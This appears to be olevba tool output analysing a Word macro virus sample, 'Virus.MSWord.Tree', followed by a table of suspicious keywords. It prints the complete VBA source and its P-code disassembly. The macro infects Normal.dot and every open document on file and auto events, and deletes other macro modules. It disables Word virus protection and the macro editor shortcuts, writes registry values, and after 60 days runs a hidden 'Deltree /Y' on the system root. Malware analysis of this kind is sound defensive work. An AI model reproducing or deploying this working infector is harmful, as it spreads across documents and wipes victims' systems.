olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tree
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tree - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ATree01.bas 
in file: Virus.MSWord.Tree - OLE stream: 'Macros/VBA/ATree01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
WordBasic.FileClose
End Sub
Sub FileExit()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
WordBasic.FileExit
End Sub
Sub FileNew()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
Dialogs(wdDialogFileOpen).Show
End Sub
Sub AutoClose()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
End Sub
Sub AutoOpen()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
End Sub
Sub MacNor(D, R, T)
MFN = False
For Each ExistMod In NormalTemplate.VBProject.VBComponents
If ExistMod.Name = T Then MFN = True
If ExistMod.Name <> D And ExistMod.Name <> T Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=ExistMod.Name, Object:=wdOrganizerObjectProjectItems
Next
If MFN = False Then Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=T, Object:=wdOrganizerObjectProjectItems
End Sub
Sub MacDoc(D, R, T)
For Each Doc In Documents
MFD = False
For Each ExistMod In Doc.VBProject.VBComponents
If ExistMod.Name = T Then MFD = True
If ExistMod.Name <> D And ExistMod.Name <> R And ExistMod.Name <> T Then Application.OrganizerDelete Source:=Doc.FullName, Name:=ExistMod.Name, Object:=wdOrganizerObjectProjectItems
Next
If MFD = False Then Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Doc.FullName, Name:=T, Object:=wdOrganizerObjectProjectItems
Next
End Sub
Sub Woptions(T, M, V, B)
On Error Resume Next
CustomizationContext = ActiveDocument.AttachedTemplate
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
CommandBars(T).Controls(M).Enable = True
CommandBars(T).Controls(M).Delete
CommandBars(V).Controls(B).Enabled = False
CommandBars(V).Controls(B).Caption = "Tree"
End Sub
Sub ViewVBCode()
End Sub
Sub RegEdCreate()
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "TreeInstall")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "TreeInstall") = Format(Date, "dd/mm/yyyy")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Tree VS Liton"
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "TreeInstall")
End If
CD = Format(Date, "mm/dd/yyyy")
ID = DateValue(ID)
CD = DateValue(CD)
Dv = CD - ID
If Dv > 60 Then
Shell "Deltree /Y " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot"), vbHide
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tree
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/ATree01 - 6911 bytes
' Line #0:
' 	FuncDefn (Sub FileClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacNor 0x0003 
' Line #3:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacDoc 0x0003 
' Line #4:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0004 "View"
' 	LitStr 0x0008 "Toolbars"
' 	ArgsCall (Call) Woptions 0x0004 
' Line #5:
' 	ArgsCall (Call) RegEdCreate 0x0000 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub FileExit())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacNor 0x0003 
' Line #11:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacDoc 0x0003 
' Line #12:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0004 "View"
' 	LitStr 0x0008 "Toolbars"
' 	ArgsCall (Call) Woptions 0x0004 
' Line #13:
' 	ArgsCall (Call) RegEdCreate 0x0000 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub FileNew())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacNor 0x0003 
' Line #19:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacDoc 0x0003 
' Line #20:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0004 "View"
' 	LitStr 0x0008 "Toolbars"
' 	ArgsCall (Call) Woptions 0x0004 
' Line #21:
' 	ArgsCall (Call) RegEdCreate 0x0000 
' Line #22:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub FileOpen())
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacNor 0x0003 
' Line #27:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacDoc 0x0003 
' Line #28:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0004 "View"
' 	LitStr 0x0008 "Toolbars"
' 	ArgsCall (Call) Woptions 0x0004 
' Line #29:
' 	ArgsCall (Call) RegEdCreate 0x0000 
' Line #30:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub AutoClose())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacNor 0x0003 
' Line #35:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacDoc 0x0003 
' Line #36:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0004 "View"
' 	LitStr 0x0008 "Toolbars"
' 	ArgsCall (Call) Woptions 0x0004 
' Line #37:
' 	ArgsCall (Call) RegEdCreate 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub AutoOpen())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacNor 0x0003 
' Line #42:
' 	LitStr 0x000C "ThisDocument"
' 	LitStr 0x0013 "Reference to Normal"
' 	LitStr 0x0007 "ATree01"
' 	ArgsCall (Call) MacDoc 0x0003 
' Line #43:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0004 "View"
' 	LitStr 0x0008 "Toolbars"
' 	ArgsCall (Call) Woptions 0x0004 
' Line #44:
' 	ArgsCall (Call) RegEdCreate 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub MacNor(D, R, T))
' Line #47:
' 	LitVarSpecial (False)
' 	St MFN 
' Line #48:
' 	StartForVariable 
' 	Ld ExistMod 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #49:
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld T 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MFN 
' 	EndIf 
' Line #50:
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld D 
' 	Ne 
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld T 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ExistMod 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	Ld MFN 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld T 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub MacDoc(D, R, T))
' Line #55:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #56:
' 	LitVarSpecial (False)
' 	St MFD 
' Line #57:
' 	StartForVariable 
' 	Ld ExistMod 
' 	EndForVariable 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #58:
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld T 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MFD 
' 	EndIf 
' Line #59:
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld D 
' 	Ne 
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld R 
' 	Ne 
' 	And 
' 	Ld ExistMod 
' 	MemLd New 
' 	Ld T 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Doc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ExistMod 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #60:
' 	StartForVariable 
' 	Next 
' Line #61:
' 	Ld MFD 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Doc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld T 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub Woptions(T, M, V, B))
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	St CustomizationContext 
' Line #67:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #68:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #69:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #70:
' 	EndWith 
' Line #71:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #72:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #73:
' 	LitVarSpecial (True)
' 	Ld M 
' 	Ld T 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enable 
' Line #74:
' 	Ld M 
' 	Ld T 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld B 
' 	Ld V 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #76:
' 	LitStr 0x0004 "Tree"
' 	Ld B 
' 	Ld V 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub ViewVBCode())
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub RegEdCreate())
' Line #81:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000B "TreeInstall"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #82:
' 	Ld ID 
' 	ArgsLd IsDate 0x0001 
' 	Not 
' 	IfBlock 
' Line #83:
' 	Ld Date 
' 	LitStr 0x000A "dd/mm/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000B "TreeInstall"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #84:
' 	LitStr 0x000D "Tree VS Liton"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #85:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000B "TreeInstall"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #88:
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	St ID 
' Line #89:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	St CD 
' Line #90:
' 	Ld CD 
' 	Ld ID 
' 	Sub 
' 	St Dv 
' Line #91:
' 	Ld Dv 
' 	LitDI2 0x003C 
' 	Gt 
' 	IfBlock 
' Line #92:
' 	LitStr 0x000B "Deltree /Y "
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

